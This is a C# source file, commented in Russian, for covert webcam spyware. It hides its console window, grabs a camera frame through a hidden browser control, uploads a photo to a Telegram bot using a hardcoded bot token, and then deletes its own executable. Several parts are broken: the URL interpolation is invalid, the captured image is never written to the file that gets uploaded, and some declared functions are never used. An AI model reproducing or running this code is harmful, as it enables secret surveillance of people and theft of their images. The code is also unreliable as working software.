using System;
using System.Net;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

class CamGrab
{
    [DllImport("user32.dll")]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    const uint KEYEVENTF_KEYDOWN = 0x0000;
    
    static void Main()
    {
        // Скрыть окно консоли
        var handle = GetConsoleWindow();
        ShowWindow(handle, 0);
        
        // Используем WebBrowser для доступа к getUserMedia (самый простой способ)
        using (var wb = new WebBrowser())
        {
            wb.ScriptErrorsSuppressed = true;
            wb.Navigate("about:blank");
            wb.Document.Write(@"
            <html>
            <body>
            <video id='v' autoplay></video>
            <canvas id='c' style='display:none'></canvas>
            <script>
            navigator.mediaDevices.getUserMedia({video:true})
                .then(stream => {
                    let v = document.getElementById('v');
                    v.srcObject = stream;
                    v.onloadedmetadata = () => {
                        let c = document.getElementById('c');
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        let img = c.toDataURL('image/jpeg', 0.8);
                        window.external.CallBack(img);
                    };
                });
            </script>
            </body>
            </html>");
            
            // Ожидаем кадр
            System.Threading.Thread.Sleep(3000);
        }
        
        // Отправка через Telegram Bot API
        string token = "7949855100:AAFB98pLp13uK1sAhRgaNg9pF8eTSbWeviM";
        string chatId = "7949855100";
        string url = $"https://api.telegram.org/bot{7949855100:AAFB98pLp13uK1sAhRgaNg9pF8eTSbWeviM}/sendPhoto";
        
        using (var client = new WebClient())
        {
            client.UploadFile(url, "photo", @"C:\snap.jpg");
        }
        
        // Самоудаление
        File.Delete(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
    }
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}